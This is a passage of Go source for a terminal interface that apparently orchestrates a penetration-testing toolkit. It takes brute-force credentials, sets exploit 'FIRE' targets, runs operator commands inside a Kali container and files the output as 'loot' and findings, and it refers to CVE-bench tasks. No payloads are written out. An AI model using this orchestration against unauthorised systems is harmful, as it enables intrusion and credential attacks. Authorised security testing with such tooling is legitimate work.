	m.controlDetailScroll = 0
	return nil
}

func (m *model) submitManualCustomCommand() tea.Cmd {
	command := normalizeCustomCommand(m.manualTargetInput)
	if command == "" {
		m.controlStatus = "manual custom command input is empty"
		return nil
	}
	m.customCommandInput = command
	m.manualTargetMode = false
	m.controlStatus = "ok :: custom command updated -> " + truncate(command, 72)
	m.controlOutput = ""
	m.controlLastLabel = "Set Custom Command"
	m.controlLastCommand = command
	m.controlDetailScroll = 0
	return nil
}

func (m *model) submitManualInnerTarget() tea.Cmd {
	target := strings.TrimSpace(m.manualTargetInput)
	if target == "" {
		m.controlStatus = "manual inner target input is empty"
		return nil
	}
	target = normalizeLootEndpoint(m.state.TargetURL, target)
	m.exploitActiveTarget = target
	m.manualTargetMode = false
	m.controlStatus = "ok :: FIRE target override -> " + truncate(target, 72)
	m.controlOutput = ""
	m.controlLastLabel = "Set Inner FIRE Target"
	m.controlLastCommand = target
	m.controlDetailScroll = 0
	return nil
}

func (m *model) submitManualBruteCredential() tea.Cmd {
	raw := strings.TrimSpace(m.manualTargetInput)
	if raw == "" {
		m.controlStatus = "manual brute credential input is empty"
		return nil
	}
	parts := strings.SplitN(raw, ":", 2)
	if len(parts) != 2 {
		m.controlStatus = "manual brute credential format invalid :: expected user:pass"
		return nil
	}
	user := strings.TrimSpace(parts[0])
	pass := strings.TrimSpace(parts[1])
	if user == "" || pass == "" {
		m.controlStatus = "manual brute credential format invalid :: expected user:pass"
		return nil
	}
	m.exploitBruteManualUser = user
	m.exploitBruteManualPass = pass
	m.manualTargetMode = false
	m.controlStatus = "ok :: brute manual credential updated -> " + truncate(user, 52)
	m.controlOutput = ""
	m.controlLastLabel = "Set Brute Manual Credential"
	m.controlLastCommand = user + ":***"
	m.controlDetailScroll = 0
	return nil
}

func (m *model) submitManualBruteToken() tea.Cmd {
	token := strings.TrimSpace(m.manualTargetInput)
	if token == "" {
		m.controlStatus = "manual brute token input is empty"
		return nil
	}
	m.exploitBruteManualToken = token
	m.manualTargetMode = false
	m.controlStatus = "ok :: brute manual token updated"
	m.controlOutput = ""
	m.controlLastLabel = "Set Brute Manual Token"
	m.controlLastCommand = truncate(token, 24)
	m.controlDetailScroll = 0
	return nil
}

func (m *model) submitManualModuleInput() tea.Cmd {
	value := strings.TrimSpace(m.manualTargetInput)
	if m.moduleInputModuleID == "" || len(m.moduleInputKeys) == 0 {
		m.manualTargetMode = false
		m.controlStatus = "module input context missing"
		return nil
	}
	mod, ok := m.attackModuleByID(m.moduleInputModuleID)
	if !ok {
		m.manualTargetMode = false
		m.controlStatus = "module input failed :: module not found"
		return nil
	}
	key := m.moduleInputKeys[clamp(m.moduleInputIdx, 0, len(m.moduleInputKeys)-1)]
	input, ok := moduleInputByKey(mod.Inputs, key)
	if !ok {
		input = attackModuleInput{Key: key}
	}
	validated, err := validateModuleInputValue(input, value)
	if err != nil {
		m.controlStatus = "module input invalid :: " + moduleInputDisplayLabel(input) + " (" + err.Error() + ")"
		return nil
	}
	if input.Required && strings.TrimSpace(validated) == "" {
		m.controlStatus = "module input required :: " + moduleInputDisplayLabel(input)
		return nil
	}
	m.moduleInputValues[m.moduleInputStorageKey(m.moduleInputModuleID, key)] = validated
	if m.moduleInputIdx+1 < len(m.moduleInputKeys) {
		m.moduleInputIdx++
		nextKey := m.moduleInputKeys[m.moduleInputIdx]
		nextValue := strings.TrimSpace(m.moduleInputValues[m.moduleInputStorageKey(m.moduleInputModuleID, nextKey)])
		if nextValue == "" {
			if nextInput, has := moduleInputByKey(mod.Inputs, nextKey); has {
				nextValue = strings.TrimSpace(nextInput.DefaultValue)
			}
		}
		m.manualTargetInput = nextValue
		nextLabel := strings.ToUpper(nextKey)
		if nextInput, has := moduleInputByKey(mod.Inputs, nextKey); has {
			nextLabel = moduleInputDisplayLabel(nextInput)
		}
		m.controlStatus = fmt.Sprintf("module input %d/%d :: %s", m.moduleInputIdx+1, len(m.moduleInputKeys), nextLabel)
		return nil
	}
	m.manualTargetMode = false
	m.controlStatus = "module inputs saved :: " + mod.Label
	m.controlLastLabel = "Module Input Saved"
	m.controlLastCommand = mod.ID
	m.controlOutput = ""
	m.controlDetailScroll = 0
	m.moduleInputIdx = 0
	return nil
}

func replayCmd(command string) tea.Cmd {
	return func() tea.Msg {
		cmd := exec.Command("docker", "exec", kaliContainerName(), "bash", "-lc", command)
		out, err := cmd.CombinedOutput()
		return replayResultMsg{
			Command: command,
			Err:     err,
			Output:  string(out),
		}
	}
}

func inferActionTelemetryPhase(action controlAction, fallback string) string {
	if isOSINTAction(action) {
		return "osint"
	}
	if isOnchainAction(action) {
		return "onchain"
	}
	group := strings.ToLower(strings.TrimSpace(action.Group))
	if group != "" {
		return group
	}
	fallback = strings.ToLower(strings.TrimSpace(fallback))
	if fallback == "" {
		return "exploit"
	}
	return fallback
}

func firstCommandToken(raw string) string {
	fields := strings.Fields(strings.TrimSpace(raw))
	if len(fields) == 0 {
		return ""
	}
	token := strings.Trim(fields[0], `"'`)
	if token == "" {
		return ""
	}
	return filepath.Base(token)
}

func actionTelemetryTool(action controlAction, commandText string) string {
	if strings.TrimSpace(action.ModuleID) != "" {
		return truncate(strings.TrimSpace(action.ModuleID), 40)
	}
	candidates := []string{
		strings.TrimSpace(action.KaliShell),
		strings.TrimSpace(commandText),
		strings.TrimSpace(action.Command),
	}
	if len(action.Args) > 0 {
		return truncate(filepath.Base(strings.TrimSpace(action.Args[0])), 40)
	}
	for _, candidate := range candidates {
		token := firstCommandToken(candidate)
		if token != "" {
			return truncate(token, 40)
		}
	}
	mode := strings.ToLower(strings.TrimSpace(action.Mode))
	if mode == "" {
		mode = "operator"
	}
	return mode
}

func telemetryCommandPreview(output string) string {
	clean := sanitizeTerminalOutput(output)
	if clean == "" {
		return ""
	}
	clean = strings.ReplaceAll(clean, "\n", " | ")
	return truncate(clean, 4000)
}

func appendCommandJSONL(path string, entry commandEntry) error {
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		return err
	}
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o644)
	if err != nil {
		return err
	}
	defer f.Close()
	data, err := json.Marshal(entry)
	if err != nil {
		return err
	}
	if _, err := f.Write(append(data, '\n')); err != nil {
		return err
	}
	return nil
}

func startTelemetryCommand(root, phase string, action controlAction, commandText string) (string, string, time.Time) {
	started := time.Now().UTC()
	commandID := fmt.Sprintf("tui-%d", started.UnixNano())
	tool := actionTelemetryTool(action, commandText)
	event := commandEntry{
		CommandID:     commandID,
		Timestamp:     started.Format(time.RFC3339),
		Phase:         inferActionTelemetryPhase(action, phase),
		Tool:          tool,
		Command:       truncate(strings.TrimSpace(commandText), 2048),
		Status:        "started",
		ExitCode:      0,
		DurationMS:    0,
		OutputPreview: "",
	}
	_ = appendCommandJSONL(filepath.Join(root, "telemetry", "commands.jsonl"), event)
	return commandID, tool, started
}

func commandExitCode(err error) int {
	if err == nil {
		return 0
	}
	var exitErr *exec.ExitError
	if errors.As(err, &exitErr) {
		if code := exitErr.ExitCode(); code >= 0 {
			return code
		}
	}
	return 1
}

func finishTelemetryCommand(root, commandID, phase, tool, commandText string, started time.Time, err error, output string, action controlAction) {
	duration := int(time.Since(started).Milliseconds())
	if duration < 0 {
		duration = 0
	}
	status := "ok"
	if err != nil {
		status = "error"
	}
	event := commandEntry{
		CommandID:     strings.TrimSpace(commandID),
		Timestamp:     time.Now().UTC().Format(time.RFC3339),
		Phase:         inferActionTelemetryPhase(action, phase),
		Tool:          truncate(strings.TrimSpace(tool), 40),
		Command:       truncate(strings.TrimSpace(commandText), 2048),
		Status:        status,
		ExitCode:      commandExitCode(err),
		DurationMS:    duration,
		OutputPreview: telemetryCommandPreview(output),
	}
	_ = appendCommandJSONL(filepath.Join(root, "telemetry", "commands.jsonl"), event)
}

func (m *model) submitLootAction() tea.Cmd {
	if m.lootOSINTMode {
		m.lootFireBusy = false
		m.lootFireStatus = "info :: OSINT taxonomy is analysis-only; run actions from CTRL"
		m.lootFireOutcome = ""
		return nil
	}
	order := lootDisplayOrderByMode(m.loot, m.lootOSINTMode, m.lootOnchainMode)
	if len(order) == 0 || m.lootIdx < 0 || m.lootIdx >= len(m.loot) {
		m.lootFireBusy = false
		m.lootFireStatus = "failed :: no loot item selected"
		m.lootFireOutcome = "failed"
		m.lootFireUntil = time.Now().Add(1900 * time.Millisecond)
		return nil
	}
	actions := lootFollowupActionsForSelection(m.loot, m.lootIdx, m.state.TargetURL, m.root)
	if len(actions) == 0 {
		m.lootFireBusy = false
		m.lootFireStatus = "failed :: no mapped command for this loot item"
		m.lootFireOutcome = "failed"
		m.lootFireUntil = time.Now().Add(1900 * time.Millisecond)
		return nil
	}
	m.lootActionIdx = clamp(m.lootActionIdx, 0, len(actions)-1)
	action := actions[m.lootActionIdx]
	if action.Command == "" || (action.Mode != "kali" && len(action.Args) == 0) {
		m.lootFireBusy = false
		m.lootFireStatus = "failed :: no mapped command for this loot item"
		m.lootFireOutcome = "failed"
		m.lootFireUntil = time.Now().Add(1900 * time.Millisecond)
		return nil
	}
	m.lootFireBusy = true
	m.lootFireStatus = "running :: " + truncate(action.Label, 56)
	m.lootFireCommand = action.Command
	m.lootFireOutput = ""
	m.lootFireOutcome = "running"
	return lootCmd(m.root, action)
}

func lootCmd(root string, action controlAction) tea.Cmd {
	return func() tea.Msg {
		var cmd *exec.Cmd
		commandText := strings.TrimSpace(action.Command)
		switch action.Mode {
		case "kali":
			shell := strings.TrimSpace(action.KaliShell)
			cmd = exec.Command("docker", "exec", kaliContainerName(), "bash", "-lc", shell)
			commandText = kaliExecCommand(shell)
		default:
			if len(action.Args) == 0 {
				return lootResultMsg{
					Label:   action.Label,
					Command: action.Command,
					Err:     fmt.Errorf("missing args for loot action"),
				}
			}
			cmd = exec.Command(action.Args[0], action.Args[1:]...)
			cmd.Dir = root
			commandText = strings.Join(action.Args, " ")
		}
		commandID, tool, started := startTelemetryCommand(root, "loot", action, commandText)
		out, err := cmd.CombinedOutput()
		output := string(out)
		finishTelemetryCommand(root, commandID, "loot", tool, commandText, started, err, output, action)
		return lootResultMsg{
			Label:   action.Label,
			Command: commandText,
			Err:     err,
			Output:  output,
		}
	}
}

func (m *model) submitPwnedAction() tea.Cmd {
	mode := strings.ToLower(strings.TrimSpace(m.fireMode))
	if mode == "" {
		mode = "exploit"
	}
	order := findingDisplayOrderByMode(m.findings, mode)
	if len(order) == 0 {
		m.pwnedFireBusy = false
		m.pwnedFireStatus = "failed :: no finding selected"
		m.pwnedFireOutcome = "failed"
		m.pwnedFireUntil = time.Now().Add(1900 * time.Millisecond)
		return nil
	}
	if indexInOrder(order, m.findingIdx) < 0 {
		m.findingIdx = order[0]
	}
	f := m.findings[m.findingIdx]
	action := findingFollowupAction(f, m.state.TargetURL, m.commands, m.findings, m.loot)
	if action.Command == "" || (action.Mode != "kali" && len(action.Args) == 0) {
		m.pwnedFireBusy = false
		m.pwnedFireStatus = "failed :: no mapped command for this finding"
		m.pwnedFireOutcome = "failed"
		m.pwnedFireUntil = time.Now().Add(1900 * time.Millisecond)
		return nil
	}
	m.pwnedFireBusy = true
	m.pwnedFireStatus = "running :: " + truncate(action.Label, 56)
	m.pwnedFireCommand = action.Command
	m.pwnedFireOutput = ""
	m.pwnedFireOutcome = "running"
	return pwnedCmd(m.root, action)
}

func pwnedCmd(root string, action controlAction) tea.Cmd {
	return func() tea.Msg {
		var cmd *exec.Cmd
		commandText := strings.TrimSpace(action.Command)
		switch action.Mode {
		case "kali":
			shell := strings.TrimSpace(action.KaliShell)
			cmd = exec.Command("docker", "exec", kaliContainerName(), "bash", "-lc", shell)
			commandText = kaliExecCommand(shell)
		default:
			if len(action.Args) == 0 {
				return pwnedResultMsg{
					Label:   action.Label,
					Command: action.Command,
					Err:     fmt.Errorf("missing args for pwned action"),
				}
			}
			cmd = exec.Command(action.Args[0], action.Args[1:]...)
			cmd.Dir = root
			commandText = strings.Join(action.Args, " ")
		}
		commandID, tool, started := startTelemetryCommand(root, "pwned", action, commandText)
		out, err := cmd.CombinedOutput()
		output := string(out)
		finishTelemetryCommand(root, commandID, "pwned", tool, commandText, started, err, output, action)
		return pwnedResultMsg{
			Label:   action.Label,
			Command: commandText,
			Err:     err,
			Output:  output,
		}
	}
}

func (m *model) submitTaxonomyAction() tea.Cmd {
	action := taxonomyFollowupAction(
		taxonomyOrder[m.taxonomyMacroIdx].Name,
		taxonomyOrder[m.taxonomyMacroIdx].Subcategories[m.taxonomySubIdx],
		m.state.TargetURL,
		m.selectedOsintDeepEngine(),
	)
	if action.Command == "" || (action.Mode != "kali" && len(action.Args) == 0) {
		m.taxonomyFireBusy = false
		m.taxonomyFireStatus = "failed :: no mapped command for this taxonomy node"
		m.taxonomyFireOutcome = "failed"
		m.taxonomyFireUntil = time.Now().Add(1900 * time.Millisecond)
		return nil
	}
	m.taxonomyFireBusy = true
	m.taxonomyFireStatus = "running :: " + truncate(action.Label, 56)
	m.taxonomyFireCommand = action.Command
	m.taxonomyFireOutput = ""
	m.taxonomyFireOutcome = "running"
	return taxonomyCmd(m.root, action)
}

func taxonomyCmd(root string, action controlAction) tea.Cmd {
	return func() tea.Msg {
		var cmd *exec.Cmd
		commandText := strings.TrimSpace(action.Command)
		switch action.Mode {
		case "kali":
			shell := strings.TrimSpace(action.KaliShell)
			cmd = exec.Command("docker", "exec", kaliContainerName(), "bash", "-lc", shell)
			commandText = kaliExecCommand(shell)
		default:
			if len(action.Args) == 0 {
				return taxonomyResultMsg{
					Label:   action.Label,
					Command: action.Command,
					Err:     fmt.Errorf("missing args for taxonomy action"),
				}
			}
			cmd = exec.Command(action.Args[0], action.Args[1:]...)
			cmd.Dir = root
			commandText = strings.Join(action.Args, " ")
		}
		commandID, tool, started := startTelemetryCommand(root, "osint", action, commandText)
		out, err := cmd.CombinedOutput()
		output := string(out)
		finishTelemetryCommand(root, commandID, "osint", tool, commandText, started, err, output, action)
		return taxonomyResultMsg{
			Label:   action.Label,
			Command: commandText,
			Err:     err,
			Output:  output,
		}
	}
}

func controlCmd(root string, action controlAction, phase string) tea.Cmd {
	return func() tea.Msg {
		var cmd *exec.Cmd
		commandText := strings.TrimSpace(action.Command)
		switch action.Mode {
		case "kali":
			shell := strings.TrimSpace(action.KaliShell)
			cmd = exec.Command("docker", "exec", kaliContainerName(), "bash", "-lc", shell)
			commandText = kaliExecCommand(shell)
		default:
			cmd = exec.Command(action.Args[0], action.Args[1:]...)
			cmd.Dir = root
			commandText = strings.Join(action.Args, " ")
		}
		commandID, tool, started := startTelemetryCommand(root, phase, action, commandText)
		out, err := cmd.CombinedOutput()
		finalOutput := string(out)
		if isOSINTAction(action) {
			if rel, persistErr := persistOSINTResult(root, action, finalOutput); persistErr != nil {
				finalOutput += "\n\n[osint-loot] persist failed :: " + persistErr.Error()
			} else if strings.TrimSpace(rel) != "" {
				finalOutput += "\n\n[osint-loot] captured :: " + rel
			}
		}
		if isOnchainAction(action) {
			if rel, persistErr := persistOnchainResult(root, action, finalOutput); persistErr != nil {
				finalOutput += "\n\n[onchain-loot] persist failed :: " + persistErr.Error()
			} else if strings.TrimSpace(rel) != "" {
				finalOutput += "\n\n[onchain-loot] captured :: " + rel
			}
		}
		if isCoopAction(action) {
			if rel, persistErr := persistCoopResult(root, action, finalOutput); persistErr != nil {
				finalOutput += "\n\n[coop-loot] persist failed :: " + persistErr.Error()
			} else if strings.TrimSpace(rel) != "" {
				finalOutput += "\n\n[coop-loot] captured :: " + rel
			}
		}
		if strings.TrimSpace(action.ModuleID) != "" {
			if rel, persistErr := persistModuleResult(root, action, finalOutput); persistErr != nil {
				finalOutput += "\n\n[module-loot] persist failed :: " + persistErr.Error()
			} else if strings.TrimSpace(rel) != "" {
				finalOutput += "\n\n[module-loot] captured :: " + rel
			}
		}
		finishTelemetryCommand(root, commandID, phase, tool, commandText, started, err, finalOutput, action)
		return controlResultMsg{
			Label:   action.Label,
			Command: commandText,
			Err:     err,
			Output:  finalOutput,
		}
	}
}

func archGraphCmd(root string, node attackGraphNode, action controlAction, role, target string) tea.Cmd {
	return func() tea.Msg {
		var cmd *exec.Cmd
		commandText := strings.TrimSpace(action.Command)
		switch strings.ToLower(strings.TrimSpace(action.Mode)) {
		case "kali":
			shell := strings.TrimSpace(action.KaliShell)
			if shell == "" {
				shell = commandText
			}
			cmd = exec.Command("docker", "exec", kaliContainerName(), "bash", "-lc", shell)
			commandText = kaliExecCommand(shell)
		default:
			run := commandText
			if run == "" {
				run = strings.TrimSpace(action.KaliShell)
			}
			cmd = exec.Command("bash", "-lc", run)
			cmd.Dir = root
			commandText = run
		}
		commandID, tool, started := startTelemetryCommand(root, "arch-map", action, commandText)
		out, err := cmd.CombinedOutput()
		output := string(out)
		finishTelemetryCommand(root, commandID, "arch-map", tool, commandText, started, err, output, action)
		return archGraphResultMsg{
			Label:   action.Label,
			Command: commandText,
			Err:     err,
			Output:  output,
			NodeID:  node.ID,
			Role:    role,
			Target:  target,
		}
	}
}

func isOSINTAction(action controlAction) bool {
	meta := strings.ToLower(action.Label + " " + action.Command + " " + action.KaliShell)
	if strings.Contains(meta, "[onchain]") || strings.Contains(meta, "onchain-") || strings.Contains(meta, "[coop]") || strings.Contains(meta, "coop-caldera") || strings.Contains(meta, "caldera") {
		return false
	}
	markers := []string{"[osint]", "osint-", "theharvester", "bbot", "spiderfoot", "recon-ng", "reconng", "rengine", "maltego"}
	for _, marker := range markers {
		if strings.Contains(meta, marker) {
			return true
		}
	}
	return false
}

func isOnchainAction(action controlAction) bool {
	meta := strings.ToLower(action.Label + " " + action.Command + " " + action.KaliShell)
	if strings.Contains(meta, "[coop]") || strings.Contains(meta, "coop-caldera") || strings.Contains(meta, "caldera") {
		return false
	}
	markers := []string{"[onchain]", "onchain-", "slither", "mythril", "forge", "anvil", "cast", "echidna", "medusa", "halmos"}
	for _, marker := range markers {
		if strings.Contains(meta, marker) {
			return true
		}
	}
	return false
}

func isCoopAction(action controlAction) bool {
	meta := strings.ToLower(action.Label + " " + action.Command + " " + action.KaliShell)
	markers := []string{"[coop]", "coop-caldera", "caldera", "/api/agents", "/api/operations", "sandcat", "stockpile"}
	for _, marker := range markers {
		if strings.Contains(meta, marker) {
			return true
		}
	}
	return false
}

func osintToolFromAction(action controlAction) string {
	meta := strings.ToLower(action.Label + " " + action.Command + " " + action.KaliShell)
	switch {
	case strings.Contains(meta, "theharvester"), strings.Contains(meta, "seed"):
		return "theharvester"
	case strings.Contains(meta, "bbot"):
		return "bbot"
	case strings.Contains(meta, "spiderfoot"):
		return "spiderfoot"
	case strings.Contains(meta, "recon-ng"), strings.Contains(meta, "reconng"):
		return "recon-ng"
	case strings.Contains(meta, "rengine"):
		return "rengine"
	case strings.Contains(meta, "maltego"):
		return "maltego"
	default:
		return "osint"
	}
}

func persistOSINTResult(root string, action controlAction, output string) (string, error) {
	text := strings.TrimSpace(output)
	if text == "" {
		return "", nil
	}
	now := time.Now().UTC()
	stamp := now.Format("20060102-150405")
	tool := osintToolFromAction(action)
	slug := sanitizeToken(tool)
	if slug == "" {
		slug = "osint"
	}
	dir := filepath.Join(root, "artifacts", "osint", "loot")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return "", err
	}
	fileName := stamp + "-" + slug + ".txt"
	fullPath := filepath.Join(dir, fileName)
	payload := strings.Join([]string{
		"# osint action",
		"label: " + action.Label,
		"command: " + strings.TrimSpace(action.Command),
		"time: " + now.Format(time.RFC3339),
		"",
		text,
	}, "\n")
	if err := os.WriteFile(fullPath, []byte(payload), 0o644); err != nil {
		return "", err
	}
	relPath := filepath.ToSlash(filepath.Join("artifacts", "osint", "loot", fileName))
	preview := firstNonEmptyLine(text)
	if preview == "" {
		preview = truncate(text, 180)
	}
	entry := lootEntry{
		Timestamp: now.Format(time.RFC3339),
		Kind:      "artifact",
		Name:      strings.ToUpper(tool) + " result",
		Source:    relPath,
		Preview:   truncate(preview, 240),
	}
	lootPath := filepath.Join(root, "telemetry", "loot.jsonl")
	if err := appendLootJSONL(lootPath, entry); err != nil {
		return "", err
	}
	return relPath, nil
}

func onchainToolFromAction(action controlAction) string {
	meta := strings.ToLower(action.Label + " " + action.Command + " " + action.KaliShell)
	switch {
	case strings.Contains(meta, "rpc-catalog"):
		return "rpc-catalog"
	case strings.Contains(meta, "address-flow"):
		return "address-flow"
	case strings.Contains(meta, "rpc-check"):
		return "rpc-check"
	case strings.Contains(meta, "slither"):
		return "slither"
	case strings.Contains(meta, "mythril"):
		return "mythril"
	case strings.Contains(meta, "forge"), strings.Contains(meta, "anvil"), strings.Contains(meta, "cast"):
		return "foundry"
	case strings.Contains(meta, "echidna"):
		return "echidna"
	case strings.Contains(meta, "medusa"):
		return "medusa"
	case strings.Contains(meta, "halmos"):
		return "halmos"
	default:
		return "onchain"
	}
}

func persistOnchainResult(root string, action controlAction, output string) (string, error) {
	text := strings.TrimSpace(output)
	if text == "" {
		return "", nil
	}
	now := time.Now().UTC()
	stamp := now.Format("20060102-150405")
	tool := onchainToolFromAction(action)
	slug := sanitizeToken(tool)
	if slug == "" {
		slug = "onchain"
	}
	dir := filepath.Join(root, "artifacts", "onchain", "loot")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return "", err
	}
	fileName := stamp + "-" + slug + ".txt"
	fullPath := filepath.Join(dir, fileName)
	payload := strings.Join([]string{
		"# onchain action",
		"label: " + action.Label,
		"command: " + strings.TrimSpace(action.Command),
		"time: " + now.Format(time.RFC3339),
		"",
		text,
	}, "\n")
	if err := os.WriteFile(fullPath, []byte(payload), 0o644); err != nil {
		return "", err
	}
	relPath := filepath.ToSlash(filepath.Join("artifacts", "onchain", "loot", fileName))
	preview := firstNonEmptyLine(text)
	if preview == "" {
		preview = truncate(text, 180)
	}
	entry := lootEntry{
		Timestamp: now.Format(time.RFC3339),
		Kind:      "artifact",
		Name:      strings.ToUpper(tool) + " result",
		Source:    relPath,
		Preview:   truncate(preview, 240),
	}
	lootPath := filepath.Join(root, "telemetry", "loot.jsonl")
	if err := appendLootJSONL(lootPath, entry); err != nil {
		return "", err
	}
	return relPath, nil
}

func coopToolFromAction(action controlAction) string {
	meta := strings.ToLower(action.Label + " " + action.Command + " " + action.KaliShell)
	switch {
	case strings.Contains(meta, "up"), strings.Contains(meta, "start"):
		return "caldera-start"
	case strings.Contains(meta, "status"):
		return "caldera-status"
	case strings.Contains(meta, "api"), strings.Contains(meta, "/api/v2/"):
		return "caldera-api"
	case strings.Contains(meta, "op-report"), strings.Contains(meta, "snapshot"):
		return "caldera-report"
	case strings.Contains(meta, "stop"):
		return "caldera-stop"
	default:
		return "caldera"
	}
}

func persistCoopResult(root string, action controlAction, output string) (string, error) {
	text := strings.TrimSpace(output)
	if text == "" {
		return "", nil
	}
	now := time.Now().UTC()
	stamp := now.Format("20060102-150405")
	tool := coopToolFromAction(action)
	slug := sanitizeToken(tool)
	if slug == "" {
		slug = "coop"
	}
	dir := filepath.Join(root, "artifacts", "coop")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return "", err
	}
	fileName := stamp + "-" + slug + ".txt"
	fullPath := filepath.Join(dir, fileName)
	payload := strings.Join([]string{
		"# coop action",
		"label: " + action.Label,
		"command: " + strings.TrimSpace(action.Command),
		"time: " + now.Format(time.RFC3339),
		"",
		text,
	}, "\n")
	if err := os.WriteFile(fullPath, []byte(payload), 0o644); err != nil {
		return "", err
	}
	relPath := filepath.ToSlash(filepath.Join("artifacts", "coop", fileName))
	preview := firstNonEmptyLine(text)
	if preview == "" {
		preview = truncate(text, 180)
	}
	entry := lootEntry{
		Timestamp: now.Format(time.RFC3339),
		Kind:      "artifact",
		Name:      strings.ToUpper(tool) + " result",
		Source:    relPath,
		Preview:   truncate(preview, 240),
	}
	lootPath := filepath.Join(root, "telemetry", "loot.jsonl")
	if err := appendLootJSONL(lootPath, entry); err != nil {
		return "", err
	}
	return relPath, nil
}

func persistModuleResult(root string, action controlAction, output string) (string, error) {
	text := strings.TrimSpace(output)
	if text == "" {
		return "", nil
	}
	now := time.Now().UTC()
	stamp := now.Format("20060102-150405")
	moduleSlug := sanitizeToken(action.ModuleID)
	if moduleSlug == "" {
		moduleSlug = "module"
	}
	dir := filepath.Join(root, "artifacts", "exploit", "modules")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return "", err
	}
	fileName := stamp + "-" + moduleSlug + ".txt"
	fullPath := filepath.Join(dir, fileName)
	payload := strings.Join([]string{
		"# module action",
		"module: " + strings.TrimSpace(action.ModuleID),
		"label: " + action.Label,
		"command: " + strings.TrimSpace(action.Command),
		"time: " + now.Format(time.RFC3339),
		"",
		text,
	}, "\n")
	if err := os.WriteFile(fullPath, []byte(payload), 0o644); err != nil {
		return "", err
	}
	relPath := filepath.ToSlash(filepath.Join("artifacts", "exploit", "modules", fileName))
	preview := firstNonEmptyLine(text)
	if preview == "" {
		preview = truncate(text, 180)
	}
	kind := strings.TrimSpace(action.Evidence.LootKind)
	if kind == "" {
		kind = "artifact"
	}
	name := strings.TrimSpace(action.Evidence.LootName)
	if name == "" {
		name = strings.TrimSpace(action.ModuleID) + " result"
	}
	if strings.TrimSpace(name) == "" {
		name = "module result"
	}
	lootEntry := lootEntry{
		Timestamp: now.Format(time.RFC3339),
		Kind:      kind,
		Name:      name,
		Source:    relPath,
		Preview:   truncate(preview, 240),
	}
	lootPath := filepath.Join(root, "telemetry", "loot.jsonl")
	if err := appendLootJSONL(lootPath, lootEntry); err != nil {
		return "", err
	}
	findingTitle := strings.TrimSpace(action.Evidence.FindingTitle)
	if findingTitle != "" {
		findingSeverity := strings.TrimSpace(action.Evidence.FindingSeverity)
		if findingSeverity == "" {
			findingSeverity = "medium"
		}
		findingImpact := strings.TrimSpace(action.Evidence.FindingImpact)
		if findingImpact == "" {
			findingImpact = "module execution generated operator evidence"
		}
		phase := strings.TrimSpace(action.Evidence.Phase)
		if phase == "" {
			phase = "module"
		}
		finding := findingEntry{
			Timestamp: now.Format(time.RFC3339),
			Severity:  findingSeverity,
			Title:     findingTitle,
			Endpoint:  strings.TrimSpace(action.Command),
			Evidence:  truncate(preview, 240),
			Impact:    findingImpact,
			Phase:     phase,
		}
		findingPath := filepath.Join(root, "telemetry", "findings.jsonl")
		if err := appendFindingJSONL(findingPath, finding); err != nil {
			return "", err
		}
	}
	return relPath, nil
}

func appendLootJSONL(path string, entry lootEntry) error {
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		return err
	}
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o644)
	if err != nil {
		return err
	}
	defer f.Close()
	data, err := json.Marshal(entry)
	if err != nil {
		return err
	}
	if _, err := f.Write(append(data, '\n')); err != nil {
		return err
	}
	return nil
}

func appendFindingJSONL(path string, entry findingEntry) error {
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		return err
	}
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o644)
	if err != nil {
		return err
	}
	defer f.Close()
	data, err := json.Marshal(entry)
	if err != nil {
		return err
	}
	if _, err := f.Write(append(data, '\n')); err != nil {
		return err
	}
	return nil
}

func sanitizeToken(value string) string {
	lower := strings.ToLower(strings.TrimSpace(value))
	re := regexp.MustCompile(`[^a-z0-9]+`)
	lower = re.ReplaceAllString(lower, "-")
	return strings.Trim(lower, "-")
}

func firstNonEmptyLine(text string) string {
	for _, line := range strings.Split(text, "\n") {
		line = strings.TrimSpace(line)
		if line != "" {
			return line
		}
	}
	return ""
}

func discoverCVETasks(root string) []string {
	metadataDir := filepath.Join(root, "external", "cve-bench", "src", "critical", "metadata")
	entries, err := os.ReadDir(metadataDir)
	if err != nil {
		return nil
	}
	tasks := []string{}
	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}
		name := entry.Name()
		if !strings.HasSuffix(strings.ToLower(name), ".yml") {
			continue
		}
		task := strings.TrimSuffix(name, filepath.Ext(name))
		task = strings.ToUpper(strings.TrimSpace(task))
		if task == "" {
			continue
		}
		tasks = append(tasks, task)
	}
	sort.Strings(tasks)
	return tasks
}

func discoverReplayRuns(root string) []string {
	runsDir := filepath.Join(root, "telemetry", "runs")
	entries, err := os.ReadDir(runsDir)
	if err != nil {
		return nil
	}
	runs := []string{}
	for _, entry := range entries {
		if !entry.IsDir() {
			continue
		}
		runPath := filepath.Join(runsDir, entry.Name())
		if !looksLikeTelemetryDir(runPath) {
			continue
		}
		runs = append(runs, runPath)
	}
	sort.Slice(runs, func(i, j int) bool {
		return filepath.Base(runs[i]) > filepath.Base(runs[j])
	})
	return runs
}

func nmapHostPortFromURL(raw string) (string, string) {
	u, err := url.Parse(strings.TrimSpace(raw))
	if err != nil {
		return "host.docker.internal", "80"
	}
	host := u.Hostname()
	port := u.Port()
	if host == "" {
		host = "host.docker.internal"
	}
	if port == "" {
		switch strings.ToLower(u.Scheme) {
		case "https":
			port = "443"
		default:
			port = "80"
		}
	}
	return host, port
}

func truncate(s string, maxLen int) string {
	if maxLen < 4 || len(s) <= maxLen {
		return s
	}
	return s[:maxLen-3] + "..."
}

func clamp(v, low, high int) int {
	if v < low {
		return low
	}
	if v > high {
		return high
	}
	return v
}

func max(a, b int) int {
	if a > b {
		return a
	}
	return b
}

func minInt(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func clampWrap(v, size int) int {
	if size <= 0 {
		return 0
	}
	for v < 0 {
		v += size
	}
	return v % size
}

func loadState(path string) stateFile {
	data, err := os.ReadFile(path)
	if err != nil {
		return stateFile{}
	}
	var out stateFile
	if err := json.Unmarshal(data, &out); err != nil {
		return stateFile{}
	}
	return out
}

func loadJSONL[T any](path string) []T {
	data, err := os.ReadFile(path)
